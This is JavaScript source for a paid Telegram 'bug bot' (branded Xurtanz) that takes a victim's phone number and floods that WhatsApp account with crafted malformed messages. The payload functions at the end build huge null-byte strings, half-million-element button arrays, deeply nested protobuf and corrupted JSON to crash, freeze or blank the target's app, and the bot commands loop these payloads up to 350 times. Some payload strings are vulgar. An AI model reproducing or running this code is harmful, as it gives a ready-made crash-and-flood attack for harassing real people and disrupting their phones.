ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Spam Hard
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoDelay4 (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Extrem 
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 350; i++) {
    await FuncaroHmmM(target);
    await sleep(1500);
    await Delay(sock, target);
    await sleep(1500);
    await Reymon(sock, target);
    await sleep(1500);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Delay Extream 
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoBlank (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Blank Andro
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 40; i++) {
    await CrashHomeClick(target);
    await sleep(4000);
    await KxAFreeze(sock, target);
    await sleep(4000);
    await CrashInvisReymon(sock, target);
    await sleep(4000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>
    


ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Blank Andro
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoDelayUi (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : DelayUi
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 40; i++) {
    await AyunBeloved(sock, target)
    await ovldelay(target)
    await XvZDelayyyx(sock, target)
    await xclowerz(sock, target)
    await unixephemeral(sock, target)
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : DelayUi
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoCrashIp (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Crash Ip
ⵢ. Status Bugs : Process 
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 60; i++) {
    await CrashFciOSKenzy(sock, target);
    await sleep(1000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Crash Ip
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/XoCrash (\d+)(?: (\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const delayInSec = match[2] ? parseInt(match[2]) : 1;
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const date = getCurrentDate();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, {
      caption: `
<blockquote>Premium Acces</blockquote>
Buyying Acces? Please Dm Owner !`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Makloeˋ 𖣂 ˋOwner", url: "https://t.me/obitp" }]
        ]
      }
    });
  }
  
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Sender Not Connected\nPlease /connect");
    }

    const sentMessage = await bot.sendMessage(chatId, `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Crash
ⵢ. Status Bugs : Process
ⵢ. Date Now : ${date}

© Xurtanz 
`, { parse_mode: "HTML" }
    );

    for (let i = 0; i < 250; i++) {
    await CrashInvisReymon(sock, target);
    await sleep(2000);
    await KxAFreeze(sock, target);
    await sleep(2000);
    await CrashHomeClick(target);
    await sleep(2000);
    console.log(chalk.red.bold(`Succes Sending Bugs To ${target}`));
    }

    await bot.editMessageText(
      `<blockquote>「 -- Bug's Xurtanz  -- 」</blockquote>

ⵢ. Target Bugs : ${target}
ⵢ. Type Bugs : Crash
ⵢ. Status Bugs : Succes Sending Bugs
ⵢ. Date Now : ${date}

© Xurtanz 
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek ⚚ Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ~ Function Bugs
async function FuncaroHmmM(target) {
    await sock.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "Funcaro",
                        locationMessage: {},
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "`ꦻ⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝҉⃝⃝⃝ោ࣯࣯៝" + "\0".repeat(900000) + "ꦾ".repeat (20000) 
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "\0"
                    },
                    carouselMessage: {}
                }
            }
        }
    }, { participant: { jid: target } });
}

async function ReymonEfcih(sock, target) {
    const msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "Reymon New Era" + "\0".repeat(40000)
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    contextInfo: {
                        quotedMessage: {
                            richResponseMessage: {}
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg, { noSelfSync: true });

    const XxxMakLu = proto.Message.encode(
        proto.Message.fromObject({
            interactiveMessage: {
                body: { text: "Mak Lu ampas jembut" },
                contextInfo: {
                    isForwarded: true,
                    buffer1: Buffer.from([0, 0, 0, 1]),
                    buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
                    buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
                    buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
                    buffer5: Buffer.from([0xff, 0, 0, 0x20])
                },
                XForwardedFor: Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "." +
                    Math.floor(Math.random() * 255) + "\r\n"
            }
        })
    ).finish();

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
        let buf = XxxMakLu;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let decodedPayload = null;

            for (let depth = 5000; depth >= 2000 && !decodedPayload; depth -= 400) {
                try {
                    const raw = inflate(tag, depth);
                    const decoded = proto.Message.decode(raw);
                    proto.Message.encode(decoded).finish();
                    decodedPayload = decoded;
                } catch (_) {}
            }

            if (!decodedPayload) continue;

            await sock.relayMessage('status@broadcast', decodedPayload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }
}

async function ReymonOneMsg(sock, target) {
    const msg = {
        contactMessage: {
            displayName: "TOKYO ENGINE GACOR",
            vcard: "999",
            contextInfo: {}
        },
        protocolMessage: {
            type: 0,
            key: { remoteJid: target, fromMe: true },
            message: {
                interactiveMessage: {
                    body: { text: "\u0000".repeat(90000) },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "quick_reply", buttonParamsJson: "\x00".repeat(25000) },
                            { name: "quick_reply", buttonParamsJson: "\0".repeat(12878) }
                        ],
                        messageParamsJson: JSON.stringify({
                            displayName: "X",
                            title: "\0".repeat(30000)
                        })
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 4000 }, () => ""),
                        forwardingScore: 9999,
                        isForwarded: true,
                        quotedMessage: {
                            locationMessage: {
                                degreesLatitude: -999.999,
                                degreesLongitude: 999.999,
                                name: "\u0000".repeat(35000),
                                address: "Faret After Ngewe".repeat(40000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 2000 }, () => ""),
                                    forwardingScore: 9999,
                                    isForwarded: true
                                }
                            }
                        }
                    }
                }
            }
        }
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
        let buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const payload = proto.Message.encode(
        proto.Message.fromObject(msg)
    ).finish();

    const inflate = function(tag, depth) {
        let buf = payload;
        for (let i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(j => j.length > 15);

    if (!jids.length) return;

    const MAX_BATCH = 5;
    const DELAY_MS = 5000;
    let totalSent = 0;

    for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
        const chunk = jids.slice(offset, offset + MAX_BATCH);
        if (offset > 0) {
            await new Promise(r => setTimeout(r, DELAY_MS));
        }

        const idx = Math.floor(offset / MAX_BATCH) + 1;
        const suffix = idx > 1 ? ('-' + idx) : '';
        const msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

        for (let ti = 0; ti < TAGS.length; ti++) {
            const tag = TAGS[ti];
            let payload = null;

            for (let depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    const decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(jid => ({
                            tag: 'to',
                            attrs: { jid: jid },
                            content: []
                        }))
                    }]
                }]
            });

            totalSent++;
        }
    }
}

async function CrashInvisReymon(sock, target) {
    const corruptedJson = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: corruptedJson,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: corruptedJson,
                address: corruptedJson
              }
            },
            body: { text: corruptedJson },
            footer: { text: corruptedJson },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: corruptedJson,
        footerText: corruptedJson,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: corruptedJson },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: corruptedJson,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: corruptedJson,
        title: corruptedJson,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: corruptedJson,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(corruptedJson).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
        mediaKey: Buffer.from(corruptedJson).toString("base64"),
        directPath: corruptedJson,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await sock.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red("✅Bug Terkirim"));
}

async function Delay(sock, target) {
    const ReymonOneMsg = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            messageSecret: Buffer.alloc(32),
            supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true
            })
        },
        interactiveMessage: {
            body: { text: "\u200B".repeat(50000) },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "quick_reply",
                        buttonParamsJson: `{"display_text":"${"\u0000".repeat(30000)}"}`
                    }
                ]
            },
            contextInfo: {
                mentionedJid: [target]
            }
        }
    };
    
    await sock.relayMessage(target, {
        viewOnceMessage: { message: ReymonOneMsg }
    }, {});
}

async function Reymon(sock, target) {
  const ReymonMsg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Reymon Kill Ahh Ahh"
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "galaxy_message" + "one_massage_crash",
                buttonParamsJson: "{}" + "\0".repeat(35000)
              }
            ]
          }
        }
      }
    }
  };

  await sock.relayMessage(target, ReymonMsg, {});
  participant: true 
}

async function KxAFreeze(sock, target) {
  try {
    const msg1 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              title: "\u0000"
            },
            body: {
              text: "Reymon"
            },
            nativeFlowMessage: {
              buttons: "\n".repeat(450000)
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg1, { participant: { jid: target } });

    const msg2 = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            nativeFlowMessage: {
              buttons: [
                {
                  name: "number_group_message",
                  buttonParamsJson: JSON.stringify({
                    display_text: "\u2069".repeat(200000),
                    id: "\u0000"
                  })
                }
              ],
              version: 3
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg2, { participant: { jid: target } });

    const msg3 = {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            body: {
              text: "Halo" + " ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ,𑇂𑆵𑆴𑆿".repeat(75000)
            },
            nativeFlowMessage: {
              buttons: Array.from({ length: 500000 }, () => ({}))
            }
          }
        }
      }
    };
    await sock.relayMessage(target, msg3, { participant: { jid: target } });

    console.log(`✅ Bugs Success Send To ${target}`);
  } catch (e) {
    console.log("❌ error:", e.message);
  }
}

async function CrashHomeClick(target) {
    const msg1 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u0BF6".repeat(50000) + "‼️⃟Créditos : ?⃟꙰ 𝑭𝑼𝑵𝑪𝑨𝑹Ø 𝑨𝑵𝑻𝑰 𝑨𝑴𝑷𝑨𝑺 ✶⤻꙳‌‌༑ᐧ‌⌁ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱ 𑇂𑆵𑆴𑆿" + "\u0000".repeat(50000)
                    },
                    nativeFlowMessage: {
                        extra: "\u0BF6".repeat(50000),
                        buttons: "A".repeat(20000)
                    }
                }
            }
        }
    }

    await sock.relayMessage(target, msg1, {})

    const msg2 = {
        interactiveMessage: {
            body: {
                text: "‼️⃟Créditos : ?⃟꙰ 𝑭𝑼𝑵𝑪𝑨𝑹Ø 𝑨𝑵𝑻𝑰 𝑨𝑴𝑷𝑨𝑺 ✶⤻꙳‌‌༑ᐧ‌⌁ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱ 𑇂𑆵𑆴𑆿" + "\u0000"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    }

    await sock.relayMessage(target, msg2, {})

    const msg3 = {
        interactiveMessage: {
            body: {
                text: "‼️⃟Créditos : ?⃟꙰ 𝑭𝑼𝑵𝑪𝑨𝑹Ø 𝑨𝑵𝑻𝑰 𝑨𝑴𝑷𝑨𝑺 ✶⤻꙳‌‌༑ᐧ‌⌁ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱ 𑇂𑆵𑆴𑆿"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 1000 }, () => ({}))
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 2000 }, () =>
                    Math.floor(Math.random() * 9000000000) + "@s.whatsapp.net"
                ),
                forwardingScore: 999999999,
                isForwarded: true
            }
        }
    }

    await sock.relayMessage(target, msg3, {})
}

async function XkaFcClick(sock, target) {
    try {
        const msg = {
            botForwardedMessage: {
                message: {
                    richResponseMessage: {
                        messageType: 2,
                        submessages: [
                            {
                                messageType: 8,
                                latexMetadata: {
                                    text: "\0",
                                    expressions: [
                                        {
                                            latexExpression: "\0",
                                            width: 999999999
                                        }
                                    ]
                                }
                            },
                            {
                                messageType: 2,
                                messageText: "halo:" + "bang mau nanya",
                                contactMessage: {
                                    displayName: "channelXkA",
                                    vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:channelXkA\nTEL:+6281234567890\nEND:VCARD"
                                }
                            }
                        ],
                        contextInfo: {
                            isForwarded: true,
                            forwardOrigin: 4,
                            participant: target
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
        console.log("✅ BUG SUKSES TERKIRIM", target);
    } catch (err) {
        console.error("❌ ERROR:", err.message);
    }
}
// ~ End Function Bugs